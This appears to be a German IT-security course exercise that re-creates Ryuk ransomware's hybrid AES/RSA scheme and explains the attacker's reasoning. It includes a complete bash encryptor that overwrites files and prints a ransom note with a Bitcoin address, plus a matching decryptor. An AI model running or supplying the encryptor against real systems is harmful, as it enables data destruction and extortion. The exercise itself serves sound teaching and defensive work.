## Teil 1: Theorie & Argumentationskette

### 1) Ziel der Übung
In dieser Übung wird die Funktionsweise der Ransomware **Ryuk** nachgestellt. Ziel ist es, den vollständigen Verschlüsselungs- und Entschlüsselungsablauf mit `openssl` in Bash-Skripten zu implementieren und die Überlegungen des Angreifers nachzuvollziehen.

---

### 2) Grundlagen: Verschlüsselungslogik von Ryuk
Ryuk verwendet ein mehrstufiges hybrides Verschlüsselungsverfahren:

* **Globaler RSA-Masterkey** (`rsa_global_key_public` / `rsa_global_key_private`) – nur dem Angreifer bekannt  
* **Pro Opfersystem** wird ein eigenes RSA-Schlüsselpaar generiert (`rsa_victim_key_public` / `rsa_victim_key_private`)  
* **Pro Datei** wird ein eigener 256-Bit AES-Schlüssel (`aes_file_key`) erzeugt  
* Die Dateien werden mit **AES-256-CBC** (IV = 0) verschlüsselt  
* Der AES-Key pro Datei wird mit dem Victim-Public-Key RSA-verschlüsselt und **an das Ende der Datei angehängt** (immer 256 Byte)  
* Der Victim-Private-Key wird selbst mit einem weiteren AES-Key (`aes_victim_key`) verschlüsselt und als `victim_private.enc` abgelegt  
* Dieser `aes_victim_key` wird wiederum mit dem globalen RSA-Master-Public-Key verschlüsselt und als `victim_key.enc` gespeichert  

Nur wer den globalen RSA-Private-Key besitzt, kann den gesamten Entschlüsselungsprozess starten.

---

### 3) Argumentationskette aus Angreifer-Sicht

* **Warum AES-256-CBC für die einzelnen Dateien?**  
  AES ist extrem schnell und eignet sich für große Datenmengen. RSA wäre für ganze Dateien viel zu langsam.

* **Warum ein eigener Key für jede Datei?**  
  Ein kompromittierter einzelner Key gefährdet nur eine Datei. Zusätzlich ermöglicht es parallele Verschlüsselung.

* **Warum wird dieser AES-Key dann RSA-verschlüsselt?**  
  Nur der Besitzer des passenden RSA-Private-Keys (der Angreifer) kann die AES-Keys wiederherstellen.

* **Warum wird der verschlüsselte AES-Key an die Datei angehängt?**  
  Sehr einfache und robuste Speicherung: Die letzten 256 Byte sind immer der verschlüsselte Key. Kein separates Key-File nötig.

* **Warum wird der `rsa_victim_key_private` mit AES verschlüsselt?**  
  Der private Victim-Key darf nicht im Klartext auf dem Opfersystem liegen, sonst könnte man ihn einfach auslesen.

* **Warum wird der `aes_victim_key` mit dem globalen RSA-Masterkey verschlüsselt?**  
  Der Master-Private-Key bleibt ausschließlich beim Angreifer. Selbst bei vollständiger Analyse des Opfersystems kann niemand entschlüsseln.

### 4) Red-Team-Skript (`ryuk_ransom`)

Das Skript führt folgende Schritte aus:
1. Verschlüsselt `rsa_victim_private.pem` mit `aes_victim_key` → `victim_private.enc`
2. Verschlüsselt `aes_victim_key` mit `rsa_global_public` → `victim_key.enc`
3. Verschlüsselt jede Datei mit einem eigenen AES-Key
4. Hängt den RSA-verschlüsselten AES-Key (256 Byte) an die Datei an
5. Gibt eine Ransom-Note aus

**Vollständiger Quellcode des Skripts:**

```bash
#!/bin/bash
# ryuk_ransom – Ryuk-ähnliche Verschlüsselung für die ITSE-Übung

if [ $# -eq 0 ]; then
  echo "Verwendung: $0 datei1 [datei2 ...]  oder  $0 testdaten/*"
  exit 1
fi

# Keys laden
AES_VICTIM_KEY=$(cat aes_victim_key.hex)
RSA_VICTIM_PUBLIC="rsa_victim_public.pem"
RSA_GLOBAL_PUBLIC="rsa_global_public.pem"

echo "[*] Starte Ryuk-Verschlüsselung..."

# 1. rsa_victim_private mit AES verschlüsseln
openssl aes-256-cbc -in rsa_victim_private.pem \
  -K "$AES_VICTIM_KEY" -iv 0 \
  -out victim_private.enc 2>/dev/null

# 2. aes_victim_key mit globalem RSA public verschlüsseln
echo -n "$AES_VICTIM_KEY" | openssl pkeyutl -encrypt \
  -pubin -inkey "$RSA_GLOBAL_PUBLIC" \
  -out victim_key.enc 2>/dev/null

echo "[+] Opfer-Keys erzeugt: victim_private.enc + victim_key.enc"

# 3. Dateien verschlüsseln
for file in "$@"; do
  if [ ! -f "$file" ]; then
    echo "[-] Überspringe (keine Datei): $file"
    continue
  fi

  AES_FILE_KEY=$(openssl rand -hex 32)

  # Datei verschlüsseln
  openssl aes-256-cbc -in "$file" \
    -K "$AES_FILE_KEY" -iv 0 \
    -out "${file}.tmp" 2>/dev/null

  # AES-Key mit Victim-Public RSA verschlüsseln
  echo -n "$AES_FILE_KEY" | openssl pkeyutl -encrypt \
    -pubin -inkey "$RSA_VICTIM_PUBLIC" \
    -out key.bin 2>/dev/null

  # Key anhängen und Original ersetzen
  cat "${file}.tmp" key.bin > "${file}.ryk"
  rm -f "$file" "${file}.tmp" key.bin
  mv "${file}.ryk" "$file"

  echo "[+] Verschlüsselt: $file"
done

# Ransom Note
echo
echo "============================================================"
echo "          YOUR FILES HAVE BEEN ENCRYPTED BY RYUK"
echo "============================================================"
echo "All your important files are encrypted with strong"
echo "AES-256-CBC + RSA-2048."
echo
echo "To recover your data send 0.5 BTC to:"
echo "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
echo
echo "After payment contact us and send your victim_key.enc"
echo "============================================================"
```

## Teil 3: Blue Team – Entschlüsselung

### 1) Ziel
Ein Skript (`ryuk_decrypt`) implementieren, das mit dem globalen Master-Private-Key (`rsa_global_private.pem`) den vollständigen Entschlüsselungsablauf durchführt.

### 2) Ablauf der Entschlüsselung
1. `victim_key.enc` wird mit `rsa_global_private` entschlüsselt → `aes_victim_key`
2. `victim_private.enc` wird mit `aes_victim_key` entschlüsselt → `rsa_victim_private`
3. Bei jeder Datei werden die letzten 256 Byte als verschlüsselter AES-Key interpretiert und mit dem Victim-Private-Key entschlüsselt
4. Die Datei wird mit dem freigeschalteten AES-Key entschlüsselt

**Vollständiger Quellcode des Skripts:**

```bash
#!/bin/bash
# ryuk_decrypt – Entschlüsselung mit globalem Master-Private-Key

if [ $# -eq 0 ]; then
  echo "Verwendung: $0 datei1 [datei2 ...]  oder  $0 testdaten/*"
  exit 1
fi

RSA_GLOBAL_PRIVATE="rsa_global_private.pem"

echo "[*] Starte Entschlüsselung..."

# 1. aes_victim_key freibekommen
AES_VICTIM_KEY=$(openssl pkeyutl -decrypt \
  -inkey "$RSA_GLOBAL_PRIVATE" \
  -in victim_key.enc 2>/dev/null)

if [ -z "$AES_VICTIM_KEY" ]; then
  echo "[-] Fehler: aes_victim_key konnte nicht entschlüsselt werden!"
  exit 1
fi
echo "[+] aes_victim_key freigeschaltet"

# 2. rsa_victim_private freibekommen
openssl aes-256-cbc -d -in victim_private.enc \
  -K "$AES_VICTIM_KEY" -iv 0 \
  -out rsa_victim_private_recovered.pem 2>/dev/null

echo "[+] rsa_victim_private freigeschaltet"

# 3. Dateien entschlüsseln
for file in "$@"; do
  if [ ! -f "$file" ]; then
    echo "[-] Überspringe: $file"
    continue
  fi

  # letzte 256 Byte = verschlüsselter AES-Key
  tail -c 256 "$file" > key.enc
  head -c -256 "$file" > data.enc

  AES_FILE_KEY=$(openssl pkeyutl -decrypt \
    -inkey rsa_victim_private_recovered.pem \
    -in key.enc 2>/dev/null)

  if [ -z "$AES_FILE_KEY" ]; then
    echo "[-] Fehler bei $file"
    rm -f key.enc data.enc
    continue
  fi

  openssl aes-256-cbc -d -in data.enc \
    -K "$AES_FILE_KEY" -iv 0 \
    -out "${file}.dec" 2>/dev/null

  rm -f key.enc data.enc "$file"
  mv "${file}.dec" "$file"

  echo "[+] Entschlüsselt: $file"
done

echo
echo "[+] Fertig. Dateien sollten wieder lesbar sein."
```

## 4) Sicherheitstechnische Bewertung

Die Ryuk-Verschlüsselungslogik ist aus Angreifer-Sicht sehr durchdacht:

* Der **globale Master-Private-Key** ist die einzige Stelle, an der die gesamte Entschlüsselungskette hängt. Ohne ihn ist eine Wiederherstellung praktisch unmöglich.
* Durch die **per-file AES-Keys** und das Anhängen an die Datei selbst wird die Verwaltung extrem einfach und robust.
* Das „Vorkonfektionieren“ der Ransomware (Victim-Keys bereits verschlüsselt mitliefern) verhindert, dass eine Analyse der Malware auf dem Opfersystem die Verschlüsselung gefährdet.
* Die Verwendung von AES-256 + RSA-2048 ist kryptographisch stark und entspricht dem Stand der Technik.

Für die Verteidigung bedeutet das:
* Ohne den Master-Private-Key gibt es keine realistische Chance auf Entschlüsselung.
* Backups, die offline und unveränderbar sind, bleiben der einzige zuverlässige Schutz.
* Die Übung zeigt eindrucksvoll, warum Ransomware so gefährlich ist – selbst bei korrekter Implementierung der Kryptographie.
